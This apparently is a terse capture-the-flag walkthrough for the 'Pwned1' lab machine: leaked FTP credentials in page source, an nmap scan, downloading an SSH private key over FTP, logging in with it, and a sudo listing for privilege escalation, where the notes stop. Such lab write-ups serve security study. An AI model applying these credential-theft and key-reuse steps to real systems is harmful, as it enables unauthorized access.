----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Pwned1
# 25/2/2023

----------------------------------------------------
# view-source:http://192.168.141.95/pwned.vuln/
----------------------------------------------------
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))


login ftp
ls
cd share
get note.txt
get id_rsa


└─$ ssh ariana@192.168.141.95 -i id_rsa 

----------------------------------------------------
# PrivEsc
----------------------------------------------------
ariana@pwned:~$ sudo -l
    (selena) NOPASSWD: /home/messenger.sh
